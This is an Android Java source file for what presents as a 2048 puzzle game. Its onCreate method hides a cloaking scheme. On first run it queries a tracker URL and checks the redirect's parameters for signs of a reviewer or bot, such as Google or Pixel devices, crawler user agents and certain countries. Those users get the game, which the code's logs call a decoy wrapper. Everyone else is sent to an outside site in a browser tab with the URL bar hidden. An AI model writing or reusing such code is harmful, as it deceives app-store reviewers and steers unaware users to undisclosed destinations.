package com.alexandr.gurenko.a2048;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.util.Log;
import android.view.KeyEvent;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabsIntent;

import com.alexandr.gurenko.a2048.game.MainView;
import com.alexandr.gurenko.a2048.game.Tile;
import com.alexandr.gurenko.a2048.onesignal.MyNotificationOpenedHandler;
import com.alexandr.gurenko.a2048.onesignal.MyNotificationReceivedHandler;
import com.onesignal.OneSignal;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.Set;
import java.util.concurrent.ExecutionException;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = MainActivity.class.getSimpleName();

    private static final String IS_FIRST_RUN = "is_first_run";
    private static final String BOOT_METHOD = "boot_method";
    private static final String GAME = "game";
    private static final String LINK = "link";

    private static final String WIDTH = "width";
    private static final String HEIGHT = "height";
    private static final String SCORE = "score";
    private static final String HIGH_SCORE = "high score temp";
    private static final String UNDO_SCORE = "undo score";
    private static final String CAN_UNDO = "can undo";
    private static final String UNDO_GRID = "undo";
    private static final String GAME_STATE = "game state";
    private static final String UNDO_GAME_STATE = "undo game state";
    private MainView view;
    private SharedPreferences sharedPreferences;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        sharedPreferences = getPreferences(MODE_PRIVATE);

        OneSignal.startInit(this)
                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                .unsubscribeWhenNotificationsAreDisabled(true)
                .setNotificationOpenedHandler(new MyNotificationOpenedHandler(this))
                .setNotificationReceivedHandler(new MyNotificationReceivedHandler())
                .init();

        if (isFirstRun() && isOnline()) {
            try {
                needToShowTheLink();
            } catch (ExecutionException | InterruptedException e) {
                e.printStackTrace();
            }
        }

        if (sharedPreferences.getString(BOOT_METHOD, LINK).equals(GAME)) {

            view = new MainView(this);

            SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(this);
            view.hasSaveState = settings.getBoolean("save_state", false);

            if (savedInstanceState != null) {
                if (savedInstanceState.getBoolean("hasState")) {
                    load();
                }
            }
            setContentView(view);
        } else {
            String url = "https://traffidomn.xyz/pYtnMY7B";
            CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
            builder.enableUrlBarHiding();
            CustomTabsIntent customTabsIntent = builder.build();
            customTabsIntent.launchUrl(this, Uri.parse(url));
        }
    }

    private boolean isFirstRun() {
        Log.d(TAG, "isFirstRun");

        boolean result = sharedPreferences.getBoolean(IS_FIRST_RUN, true);

        SharedPreferences.Editor ed = sharedPreferences.edit();
        ed.putBoolean(IS_FIRST_RUN, false);
        ed.apply();

        return result;
    }

    public boolean isOnline() {
        Log.d(TAG, "isOnline");
        ConnectivityManager cm = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo wifiInfo = null;
        if (cm != null) {
            wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        }
        if (wifiInfo != null && wifiInfo.isConnected()) {
            return true;
        }
        if (cm != null) {
            wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        }
        if (wifiInfo != null && wifiInfo.isConnected()) {
            return true;
        }
        if (cm != null) {
            wifiInfo = cm.getActiveNetworkInfo();
        }
        return wifiInfo != null && wifiInfo.isConnected();
    }

    private void needToShowTheLink() throws ExecutionException, InterruptedException {
        Log.d(TAG, "needToShowTheLink");

        SharedPreferences.Editor editor = sharedPreferences.edit();

        Map<String, String[]> conditions = new HashMap<>();
        conditions.put("sub1", new String[]{"FreeBSD", "Firefox", "Linux"});
        conditions.put("sub3", new String[]{"Nexus", "Pixel", "Moto", "Google"});
        conditions.put("sub4", new String[]{"1"});
        conditions.put("sub5", new String[]{"1"});
        conditions.put("sub6", new String[]{"AR"});
        conditions.put("sub7", new String[]{"US", "PH", "NL", "GB", "IN", "IE"});
        conditions.put("sub9", new String[]{"google", "bot", "adwords", "rawler", "spy", "o-http-client",
                "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 5X Build/MTC20F)",
                "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G935F Build/NRD90M)",
                "Dalvik/2.1.0 (Linux; U; Android 7.0; WAS-LX1A Build/HUAWEIWAS-LX1A)"});
        Log.d(TAG, "Map");

        final String url = "https://appstrack18.xyz/CX67h1bP";

        String location = "";

        ProgressTask progressTask = (ProgressTask) new ProgressTask().execute(url);
        long currentTime = System.currentTimeMillis();
        while (location.equals("")) {
            location = progressTask.get();
            if (currentTime < System.currentTimeMillis() - 2500)
                break;
        }

        Log.d(TAG, location.equals("") ? "0" : location);
        if (url.equals(location) || location.equals("")) {
            editor.putString(BOOT_METHOD, GAME);
            editor.apply();
            Log.d(TAG, "Показываем фантик");
            return;
        }
        Uri uri = Uri.parse(location);
        Set<String> params = uri.getQueryParameterNames();
        for (String param : params) {
            Log.d(TAG, param + "=" + uri.getQueryParameter(param));
            if (conditions.containsKey(param)) {
                for (String val : Objects.requireNonNull(conditions.get(param))) {
                    if (Objects.requireNonNull(uri.getQueryParameter(param)).length() > 0 &&
                            (Objects.requireNonNull(uri.getQueryParameter(param)).toLowerCase().contains(val.toLowerCase()))) {
                        editor.putString(BOOT_METHOD, GAME);
                        editor.apply();
                        Log.d(TAG, "Загружаем фантик: " + param + "=" + uri.getQueryParameter(param));
                        return;
                    }
                }
            }
        }

        editor.putString(BOOT_METHOD, LINK);
        editor.apply();
        Log.d(TAG, "Показываем ссылку");

    }


    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_MENU) {
            //Do nothing
            return true;
        } else if (keyCode == KeyEvent.KEYCODE_DPAD_DOWN) {
            view.game.move(2);
            return true;
        } else if (keyCode == KeyEvent.KEYCODE_DPAD_UP) {
            view.game.move(0);
            return true;
        } else if (keyCode == KeyEvent.KEYCODE_DPAD_LEFT) {
            view.game.move(3);
            return true;
        } else if (keyCode == KeyEvent.KEYCODE_DPAD_RIGHT) {
            view.game.move(1);
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onSaveInstanceState(@NonNull Bundle savedInstanceState) {
        super.onSaveInstanceState(savedInstanceState);
        savedInstanceState.putBoolean("hasState", true);
        if (sharedPreferences.getString(BOOT_METHOD, LINK).equals(GAME))
            save();
    }

    protected void onPause() {
        super.onPause();
        if (sharedPreferences.getString(BOOT_METHOD, LINK).equals(GAME))
            save();
    }

    private void save() {
        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(this);
        SharedPreferences.Editor editor = settings.edit();
        Tile[][] field = view.game.grid.field;
        Tile[][] undoField = view.game.grid.undoField;
        editor.putInt(WIDTH, field.length);
        editor.putInt(HEIGHT, field.length);
        for (int xx = 0; xx < field.length; xx++) {
            for (int yy = 0; yy < field[0].length; yy++) {
                if (field[xx][yy] != null) {
                    editor.putInt(xx + " " + yy, field[xx][yy].getValue());
                } else {
                    editor.putInt(xx + " " + yy, 0);
                }

                if (undoField[xx][yy] != null) {
                    editor.putInt(UNDO_GRID + xx + " " + yy, undoField[xx][yy].getValue());
                } else {
                    editor.putInt(UNDO_GRID + xx + " " + yy, 0);
                }
            }
        }
        editor.putLong(SCORE, view.game.score);
        editor.putLong(HIGH_SCORE, view.game.highScore);
        editor.putLong(UNDO_SCORE, view.game.lastScore);
        editor.putBoolean(CAN_UNDO, view.game.canUndo);
        editor.putInt(GAME_STATE, view.game.gameState);
        editor.putInt(UNDO_GAME_STATE, view.game.lastGameState);
        editor.apply();
    }

    protected void onResume() {
        super.onResume();
        if (sharedPreferences.getString(BOOT_METHOD, LINK).equals(GAME))
            load();
    }

    private void load() {
        //Stopping all animations
        view.game.aGrid.cancelAnimations();

        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(this);
        for (int xx = 0; xx < view.game.grid.field.length; xx++) {
            for (int yy = 0; yy < view.game.grid.field[0].length; yy++) {
                int value = settings.getInt(xx + " " + yy, -1);
                if (value > 0) {
                    view.game.grid.field[xx][yy] = new Tile(xx, yy, value);
                } else if (value == 0) {
                    view.game.grid.field[xx][yy] = null;
                }

                int undoValue = settings.getInt(UNDO_GRID + xx + " " + yy, -1);
                if (undoValue > 0) {
                    view.game.grid.undoField[xx][yy] = new Tile(xx, yy, undoValue);
                } else if (value == 0) {
                    view.game.grid.undoField[xx][yy] = null;
                }
            }
        }

        view.game.score = settings.getLong(SCORE, view.game.score);
        view.game.highScore = settings.getLong(HIGH_SCORE, view.game.highScore);
        view.game.lastScore = settings.getLong(UNDO_SCORE, view.game.lastScore);
        view.game.canUndo = settings.getBoolean(CAN_UNDO, view.game.canUndo);
        view.game.gameState = settings.getInt(GAME_STATE, view.game.gameState);
        view.game.lastGameState = settings.getInt(UNDO_GAME_STATE, view.game.lastGameState);
    }

    @SuppressLint("StaticFieldLeak")
    private class ProgressTask extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... strings) {
            String location = null;

            try {
                HttpURLConnection connection = (HttpURLConnection) new URL(strings[0]).openConnection();
                connection.setInstanceFollowRedirects(false);
                connection.connect();
                location = connection.getHeaderField("Location");
            } catch (IOException e) {
                e.printStackTrace();
            }

            return location;
        }

    }

}
